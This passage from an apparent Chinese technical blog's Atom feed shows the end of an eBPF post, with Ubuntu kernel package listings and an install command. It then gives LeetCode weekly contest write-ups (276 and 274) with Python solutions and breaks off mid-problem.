buildinfo for version 5.3.0 on 64 bit x86 SMP</span><br><span class="line">linux-cloud-tools-5.3.0-40-generic - Linux kernel version specific cloud tools for version 5.3.0-40</span><br><span class="line">linux-cloud-tools-5.3.0-40-lowlatency - Linux kernel version specific cloud tools for version 5.3.0-40</span><br><span class="line">linux-headers-5.3.0-40 - Header files related to Linux kernel version 5.3.0</span><br><span class="line">linux-headers-5.3.0-40-generic - Linux kernel headers for version 5.3.0 on 64 bit x86 SMP</span><br><span class="line">linux-headers-5.3.0-40-lowlatency - Linux kernel headers for version 5.3.0 on 64 bit x86 SMP</span><br><span class="line">linux-hwe-cloud-tools-5.3.0-40 - Linux kernel version specific cloud tools for version 5.3.0-40</span><br><span class="line">linux-hwe-tools-5.3.0-40 - Linux kernel version specific tools for version 5.3.0-40</span><br><span class="line">linux-image-5.3.0-40-generic - Signed kernel image generic</span><br><span class="line">linux-image-5.3.0-40-lowlatency - Signed kernel image lowlatency</span><br><span class="line">linux-image-unsigned-5.3.0-40-generic - Linux kernel image for version 5.3.0 on 64 bit x86 SMP</span><br><span class="line">linux-image-unsigned-5.3.0-40-lowlatency - Linux kernel image for version 5.3.0 on 64 bit x86 SMP</span><br><span class="line">linux-modules-5.3.0-40-generic - Linux kernel extra modules for version 5.3.0 on 64 bit x86 SMP</span><br><span class="line">linux-modules-5.3.0-40-lowlatency - Linux kernel extra modules for version 5.3.0 on 64 bit x86 SMP</span><br><span class="line">linux-modules-extra-5.3.0-40-generic - Linux kernel extra modules for version 5.3.0 on 64 bit x86 SMP</span><br><span class="line">linux-tools-5.3.0-40-generic - Linux kernel version specific tools for version 5.3.0-40</span><br><span class="line">linux-tools-5.3.0-40-lowlatency - Linux kernel version specific tools for version 5.3.0-40</span><br><span class="line">linux-modules-nvidia-390-5.3.0-40-generic - Linux kernel nvidia modules for version 5.3.0-40</span><br><span class="line">linux-modules-nvidia-390-5.3.0-40-lowlatency - Linux kernel nvidia modules for version 5.3.0-40</span><br><span class="line">linux-modules-nvidia-430-5.3.0-40-generic - Linux kernel nvidia modules for generic version 5.3.0-40</span><br><span class="line">linux-modules-nvidia-430-5.3.0-40-lowlatency - Linux kernel nvidia modules for lowlatency version 5.3.0-40</span><br><span class="line">linux-modules-nvidia-435-5.3.0-40-generic - Linux kernel nvidia modules for generic version 5.3.0-40</span><br><span class="line">linux-modules-nvidia-435-5.3.0-40-lowlatency - Linux kernel nvidia modules for lowlatency version 5.3.0-40</span><br></pre></td></tr></table></figure><h6 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install linux-headers-5.3.0-40-generic linux-image-5.3.0-40-generic</span><br></pre></td></tr></table></figure><h6 id="重启后查询内核版本"><a href="#重启后查询内核版本" class="headerlink" title="重启后查询内核版本"></a>重启后查询内核版本</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~$ uname -r</span><br><span class="line">5.3.0-40-generic</span><br></pre></td></tr></table></figure><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><a href="https://ebpf.io/what-is-ebpf/" target="_blank" rel="noopener">https://ebpf.io/what-is-ebpf/</a></li><li><a href="https://www.dazhuanlan.com/lganlan/topics/1072521" target="_blank" rel="noopener">https://www.dazhuanlan.com/lganlan/topics/1072521</a></li><li><a href="https://arthurchiao.art/blog/cilium-bpf-xdp-reference-guide-zh/" target="_blank" rel="noopener">https://arthurchiao.art/blog/cilium-bpf-xdp-reference-guide-zh/</a></li><li><a href="https://jishuin.proginn.com/p/763bfbd6368e" target="_blank" rel="noopener">https://jishuin.proginn.com/p/763bfbd6368e</a></li><li><a href="https://forsworns.github.io/zh/blogs/20210311/" target="_blank" rel="noopener">https://forsworns.github.io/zh/blogs/20210311/</a></li><li><a href="http://arthurchiao.art/blog/socket-acceleration-with-ebpf-zh/" target="_blank" rel="noopener">http://arthurchiao.art/blog/socket-acceleration-with-ebpf-zh/</a></li><li><a href="https://www.cnxct.com/lessons-using-ebpf-accelerating-cloud-native-zh/" target="_blank" rel="noopener">https://www.cnxct.com/lessons-using-ebpf-accelerating-cloud-native-zh/</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h4&gt;&lt;p&gt;最近因为一些原因开始学习eBPF，后续也将持续学习eBPF的一些具体应用。&lt;/p&gt;
&lt;h4 id=&quot;BPF发展史&quot;&gt;&lt;a href=&quot;#BP
      
    
    </summary>
    
    
      <category term="Linux" scheme="elssm.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Leetcode第276场周赛write up</title>
    <link href="elssm.github.io/2022/01/16/Leetcode%E7%AC%AC276%E5%9C%BA%E5%91%A8%E8%B5%9Bwrite-up/"/>
    <id>elssm.github.io/2022/01/16/Leetcode第276场周赛write-up/</id>
    <published>2022-01-16T06:00:39.000Z</published>
    <updated>2022-01-16T06:20:12.246Z</updated>
    
    <content type="html"><![CDATA[<h4 id="将字符串拆分为若干长度为-k-的组"><a href="#将字符串拆分为若干长度为-k-的组" class="headerlink" title="将字符串拆分为若干长度为 k 的组"></a>将字符串拆分为若干长度为 k 的组</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">字符串 s 可以按下述步骤划分为若干长度为 k 的组：</span><br><span class="line">第一组由字符串中的前 k 个字符组成，第二组由接下来的 k 个字符串组成，依此类推。每个字符都能够成为 某一个 组的一部分。</span><br><span class="line">对于最后一组，如果字符串剩下的字符 不足 k 个，需使用字符 fill 来补全这一组字符。</span><br><span class="line">注意，在去除最后一个组的填充字符 fill（如果存在的话）并按顺序连接所有的组后，所得到的字符串应该是 s 。</span><br><span class="line">给你一个字符串 s ，以及每组的长度 k 和一个用于填充的字符 fill ，按上述步骤处理之后，返回一个字符串数组，该数组表示 s 分组后 每个组的组成情况 。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">输入：s = &quot;abcdefghi&quot;, k = 3, fill = &quot;x&quot;</span><br><span class="line">输出：[&quot;abc&quot;,&quot;def&quot;,&quot;ghi&quot;]</span><br><span class="line">解释：</span><br><span class="line">前 3 个字符是 &quot;abc&quot; ，形成第一组。</span><br><span class="line">接下来 3 个字符是 &quot;def&quot; ，形成第二组。</span><br><span class="line">最后 3 个字符是 &quot;ghi&quot; ，形成第三组。</span><br><span class="line">由于所有组都可以由字符串中的字符完全填充，所以不需要使用填充字符。</span><br><span class="line">因此，形成 3 组，分别是 &quot;abc&quot;、&quot;def&quot; 和 &quot;ghi&quot; 。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">输入：s = &quot;abcdefghij&quot;, k = 3, fill = &quot;x&quot;</span><br><span class="line">输出：[&quot;abc&quot;,&quot;def&quot;,&quot;ghi&quot;,&quot;jxx&quot;]</span><br><span class="line">解释：</span><br><span class="line">与前一个例子类似，形成前三组 &quot;abc&quot;、&quot;def&quot; 和 &quot;ghi&quot; 。</span><br><span class="line">对于最后一组，字符串中仅剩下字符 &apos;j&apos; 可以用。为了补全这一组，使用填充字符 &apos;x&apos; 两次。</span><br><span class="line">因此，形成 4 组，分别是 &quot;abc&quot;、&quot;def&quot;、&quot;ghi&quot; 和 &quot;jxx&quot; 。</span><br></pre></td></tr></table></figure><p>常规题，先分割，再填补。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">divideString</span><span class="params">(self, s, k, fill)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type s: str</span></span><br><span class="line"><span class="string">        :type k: int</span></span><br><span class="line"><span class="string">        :type fill: str</span></span><br><span class="line"><span class="string">        :rtype: List[str]</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        res = []</span><br><span class="line">        <span class="keyword">while</span> len(s)&gt;=k:</span><br><span class="line">            t = s[:k]</span><br><span class="line">            s = s[k:]</span><br><span class="line">            res.append(t)</span><br><span class="line">        <span class="keyword">if</span> len(s)==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> res</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(k-len(s)):</span><br><span class="line">                s+=fill</span><br><span class="line">            res.append(s)</span><br><span class="line">            <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><h4 id="得到目标值的最少行动次数"><a href="#得到目标值的最少行动次数" class="headerlink" title="得到目标值的最少行动次数"></a>得到目标值的最少行动次数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">你正在玩一个整数游戏。从整数 1 开始，期望得到整数 target 。</span><br><span class="line">在一次行动中，你可以做下述两种操作之一：</span><br><span class="line">递增，将当前整数的值加 1（即， x = x + 1）。</span><br><span class="line">加倍，使当前整数的值翻倍（即，x = 2 * x）。</span><br><span class="line">在整个游戏过程中，你可以使用 递增 操作 任意 次数。但是只能使用 加倍 操作 至多 maxDoubles 次。</span><br><span class="line">给你两个整数 target 和 maxDoubles ，返回从 1 开始得到 target 需要的最少行动次数。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：target = 5, maxDoubles = 0</span><br><span class="line">输出：4</span><br><span class="line">解释：一直递增 1 直到得到 target 。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">输入：target = 19, maxDoubles = 2</span><br><span class="line">输出：7</span><br><span class="line">解释：最初，x = 1 。</span><br><span class="line">递增 3 次，x = 4 。</span><br><span class="line">加倍 1 次，x = 8 。</span><br><span class="line">递增 1 次，x = 9 。</span><br><span class="line">加倍 1 次，x = 18 。</span><br><span class="line">递增 1 次，x = 19 。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">输入：target = 10, maxDoubles = 4</span><br><span class="line">输出：4</span><br><span class="line">解释：</span><br><span class="line">最初，x = 1 。 </span><br><span class="line">递增 1 次，x = 2 。 </span><br><span class="line">加倍 1 次，x = 4 。 </span><br><span class="line">递增 1 次，x = 5 。 </span><br><span class="line">加倍 1 次，x = 10 。</span><br></pre></td></tr></table></figure><p>这道题我们首先能想到的是，尽可能多的使用“加倍”操作。既然是从1开始，我们就想办法让输入变为1即可。在操作的过程中，我们需要考虑两种情况：当前值是奇数还是偶数。<br>如果是奇数，我们需要让他变成偶数，方便我们的“除2”操作。因此给当前数减去1即可<br>如果是偶数，我们又需要考虑两种情况。是否可以进行”除2“操作。<br>也就是我们需要对<code>maxDoubles</code>的值进行判断。<br>如果<code>maxDoubles</code>大于零，那我们正常进行除法操作即可。<br>如果<code>maxDoubles</code>已经变为零，那我们也不需要一个一个的递减了，直接变为1即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">minMoves</span><span class="params">(self, target, maxDoubles)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type target: int</span></span><br><span class="line"><span class="string">        :type maxDoubles: int</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        count = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> target != <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">if</span> target % <span class="number">2</span>:</span><br><span class="line">                target -= <span class="number">1</span></span><br><span class="line">                count +=<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> maxDoubles&gt;<span class="number">0</span>:</span><br><span class="line">                    target /=<span class="number">2</span></span><br><span class="line">                    count+=<span class="number">1</span></span><br><span class="line">                    maxDoubles -=<span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    count+=target<span class="number">-1</span></span><br><span class="line">                    target = <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> count</span><br></pre></td></tr></table></figure><h4 id="解决智力问题"><a href="#解决智力问题" class="headerlink" title="解决智力问题"></a>解决智力问题</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">给你一个下标从0开始的二维整数数组 questions ，其中 questions[i] = [pointsi, brainpoweri]。</span><br><span class="line">这个数组表示一场考试里的一系列题目，你需要 按顺序 （也就是从问题 0 开始依次解决），针对每个问题选择 解决 或者 跳过 操作。解决问题 i 将让你 获得  pointsi 的分数，但是你将 无法 解决接下来的 brainpoweri 个问题（即只能跳过接下来的 brainpoweri 个问题）。如果你跳过问题 i ，你可以对下一个问题决定使用哪种操作。</span><br><span class="line">比方说，给你 questions = [[3, 2], [4, 3], [4, 4], [2, 5]] ：</span><br><span class="line">如果问题 0 被解决了， 那么你可以获得 3 分，但你不能解决问题 1 和 2 。</span><br><span class="line">如果你跳过问题 0 ，且解决问题 1 ，你将获得 4 分但是不能解决问题 2 和 3 。</span><br><span class="line">请你返回这场考试里你能获得的 最高 分数。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">输入：questions = [[3,2],[4,3],[4,4],[2,5]]</span><br><span class="line">输出：5</span><br><span class="line">解释：解决问题 0 和 3 得到最高分。</span><br><span class="line">- 解决问题 0 ：获得 3 分，但接下来 2 个问题都不能解决。</span><br><span class="line">- 不能解决问题 1 和 2</span><br><span class="line">- 解决问题 3 ：获得 2 分</span><br><span class="line">总得分为：3 + 2 = 5 。没有别的办法获得 5 分或者多于 5 分。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">输入：questions = [[1,1],[2,2],[3,3],[4,4],[5,5]]</span><br><span class="line">输出：7</span><br><span class="line">解释：解决问题 1 和 4 得到最高分。</span><br><span class="line">- 跳过问题 0</span><br><span class="line">- 解决问题 1 ：获得 2 分，但接下来 2 个问题都不能解决。</span><br><span class="line">- 不能解决问题 2 和 3</span><br><span class="line">- 解决问题 4 ：获得 5 分</span><br><span class="line">总得分为：2 + 5 = 7 。没有别的办法获得 7 分或者多于 7 分。</span><br></pre></td></tr></table></figure><p>这道题需要反向动态规划，即当前值的最大值是根据后面的值来得出的，因此我们先计算后面的值！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">mostPoints</span><span class="params">(self, questions)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type questions: List[List[int]]</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="comment">#动态规划</span></span><br><span class="line">        dp = [<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> range(len(questions)+<span class="number">1</span>)]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(questions)<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>):</span><br><span class="line">            <span class="comment">#如果当前位置加上brainpower没有超出数组长度</span></span><br><span class="line">            <span class="keyword">if</span> i+questions[i][<span class="number">1</span>] &lt; len(questions):</span><br><span class="line">                <span class="string">"""</span></span><br><span class="line"><span class="string">                1.做这道题+做下一跳题的得分和</span></span><br><span class="line"><span class="string">                2.不做这道题，做下一题的得分</span></span><br><span class="line"><span class="string">                """</span></span><br><span class="line">                dp[i] = max(questions[i][<span class="number">0</span>] + dp[i + questions[i][<span class="number">1</span>] + <span class="number">1</span>],dp[i + <span class="number">1</span>])</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="comment">#如果当前位置加上brainpower已经超出数组长度</span></span><br><span class="line">                <span class="comment">#当前位置的值是当前值的得分和下一个位置所得分之间的较大值</span></span><br><span class="line">                dp[i] = max(dp[i+<span class="number">1</span>],questions[i][<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">return</span> dp[<span class="number">0</span>]</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;将字符串拆分为若干长度为-k-的组&quot;&gt;&lt;a href=&quot;#将字符串拆分为若干长度为-k-的组&quot; class=&quot;headerlink&quot; title=&quot;将字符串拆分为若干长度为 k 的组&quot;&gt;&lt;/a&gt;将字符串拆分为若干长度为 k 的组&lt;/h4&gt;&lt;figure class
      
    
    </summary>
    
    
      <category term="Algorithm" scheme="elssm.github.io/tags/Algorithm/"/>
    
  </entry>
  
  <entry>
    <title>Leetcode第274场周赛write up</title>
    <link href="elssm.github.io/2022/01/02/Leetcode%E7%AC%AC274%E5%9C%BA%E5%91%A8%E8%B5%9Bwrite-up/"/>
    <id>elssm.github.io/2022/01/02/Leetcode第274场周赛write-up/</id>
    <published>2022-01-02T09:07:07.000Z</published>
    <updated>2022-01-02T09:19:33.780Z</updated>
    
    <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>老三样如约而至。。。。</p><h4 id="检查是否所有-A-都在-B-之前"><a href="#检查是否所有-A-都在-B-之前" class="headerlink" title="检查是否所有 A 都在 B 之前"></a>检查是否所有 A 都在 B 之前</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">给你一个 仅 由字符 &apos;a&apos; 和 &apos;b&apos; 组成的字符串  s 。如果字符串中 每个 &apos;a&apos; 都出现在 每个 &apos;b&apos; 之前，返回 true ；否则，返回 false 。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">输入：s = &quot;aaabbb&quot;</span><br><span class="line">输出：true</span><br><span class="line">解释：</span><br><span class="line">&apos;a&apos; 位于下标 0、1 和 2 ；而 &apos;b&apos; 位于下标 3、4 和 5 。</span><br><span class="line">因此，每个 &apos;a&apos; 都出现在每个 &apos;b&apos; 之前，所以返回 true 。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">输入：s = &quot;abab&quot;</span><br><span class="line">输出：false</span><br><span class="line">解释：</span><br><span class="line">存在一个 &apos;a&apos; 位于下标 2 ，而一个 &apos;b&apos; 位于下标 1 。</span><br><span class="line">因此，不能满足每个 &apos;a&apos; 都出现在每个 &apos;b&apos; 之前，所以返回 false</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">输入：s = &quot;bbb&quot;</span><br><span class="line">输出：true</span><br><span class="line">解释：</span><br><span class="line">不存在 &apos;a&apos; ，因此可以视作每个 &apos;a&apos; 都出现在每个 &apos;b&apos; 之前，所以返回 true 。</span><br></pre></td></tr></table></figure><p>There’s nothing to say，第一道题面前重拳出击！🐶</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkString</span><span class="params">(self, s)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type s: str</span></span><br><span class="line"><span class="string">        :rtype: bool</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'a'</span> <span class="keyword">not</span> <span class="keyword">in</span> s <span class="keyword">or</span> <span class="string">'b'</span> <span class="keyword">not</span> <span class="keyword">in</span> s:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        count = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">            <span class="keyword">if</span> i == <span class="string">'a'</span>:</span><br><span class="line">                count += <span class="number">1</span></span><br><span class="line">        index_b = s.index(<span class="string">'b'</span>)</span><br><span class="line">        <span class="keyword">if</span> count &lt;= index_b:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><h4 id="银行中的激光束数量"><a href="#银行中的激光束数量" class="headerlink" title="银行中的激光束数量"></a>银行中的激光束数量</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">银行内部的防盗安全装置已经激活。给你一个下标从 0 开始的二进制字符串数组 bank ，表示银行的平面图，这是一个大小为 m x n 的二维矩阵。 bank[i] 表示第 i 行的设备分布，由若干 &apos;0&apos; 和若干 &apos;1&apos; 组成。&apos;0&apos; 表示单元格是空的，而 &apos;1&apos; 表示单元格有一个安全设备。</span><br><span class="line">对任意两个安全设备而言，如果同时 满足下面两个条件，则二者之间存在 一个 激光束：</span><br><span class="line">两个设备位于两个 不同行 ：r1 和 r2 ，其中 r1 &lt; r2 。</span><br><span class="line">满足 r1 &lt; i &lt; r2 的 所有 行 i ，都 没有安全设备 。</span><br><span class="line">激光束是独立的，也就是说，一个激光束既不会干扰另一个激光束，也不会与另一个激光束合并成一束。</span><br><span class="line">返回银行中激光束的总数量。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">输入：bank = [&quot;011001&quot;,&quot;000000&quot;,&quot;010100&quot;,&quot;001000&quot;]</span><br><span class="line">输出：8</span><br><span class="line">解释：在下面每组设备对之间，存在一条激光束。总共是 8 条激光束：</span><br><span class="line"> * bank[0][1] -- bank[2][1]</span><br><span class="line"> * bank[0][1] -- bank[2][3]</span><br><span class="line"> * bank[0][2] -- bank[2][1]</span><br><span class="line"> * bank[0][2] -- bank[2][3]</span><br><span class="line"> * bank[0][5] -- bank[2][1]</span><br><span class="line"> * bank[0][5] -- bank[2][3]</span><br><span class="line"> * bank[2][1] -- bank[3][2]</span><br><span class="line"> * bank[2][3] -- bank[3][2]</span><br><span class="line">注意，第 0 行和第 3 行上的设备之间不存在激光束。</span><br><span class="line">这是因为第 2 行存在安全设备，这不满足第 2 个条件。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：bank = [&quot;000&quot;,&quot;111&quot;,&quot;000&quot;]</span><br><span class="line">输出：0</span><br><span class="line">解释：不存在两个位于不同行的设备</span><br></pre></td></tr></table></figure><p>这道题的思路就是交叉相成，看成一个多行的数组，每一行的1的个数乘其他行1的个数。前提是两行之前能相乘的原则是中间行1的个数都为0。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">numberOfBeams</span><span class="params">(self, bank)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type bank: List[str]</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        res = []</span><br><span class="line">        <span class="comment">#统计每一行1的个数</span></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> bank:</span><br><span class="line">            res.append(list(line).count(<span class="string">'1'</span>))</span><br><span class="line">        <span class="comment">#设置保存光束的全局值</span></span><br><span class="line">        ans = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(res)):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(i+<span class="number">1</span>,len(res)):</span><br><span class="line">                <span class="comment">#如果当前行都是0，则走到下一行</span></span><br><span class="line">                <span class="keyword">if</span> res[j] == <span class="number">0</span>:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="comment">#如果当前行存在1，则直接计算光束值，后续的行就不需要计算，直接跳出循环</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    ans += res[i]*res[j]</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">return</span> ans</span><br></pre></td></tr></table></figure><h4 id="摧毁小行星"><a href="#摧毁小行星" class="headerlink" title="摧毁小行星"></a>摧毁小行星</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">给你一个整数 mass ，它表示一颗行星的初始质量。再给你一个整数数组 asteroids ，其中 asteroids[i] 是第 i 